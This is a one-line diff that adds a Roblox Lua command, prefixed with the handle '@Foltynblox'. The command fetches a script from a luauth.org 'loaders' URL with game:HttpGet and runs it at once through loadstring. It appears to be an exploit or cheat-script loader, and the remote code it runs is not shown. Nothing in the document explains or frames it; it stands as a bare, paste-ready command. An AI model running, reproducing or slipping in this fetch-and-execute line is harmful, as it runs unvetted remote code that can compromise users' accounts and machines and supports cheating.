@@ -1,0 +1,1 @@
+@Foltynblox:loadstring(game:HttpGet("https://luauth.org/files/v1/loaders/3ca64ef5ed96693d419381e2a9dead71.lua"))()
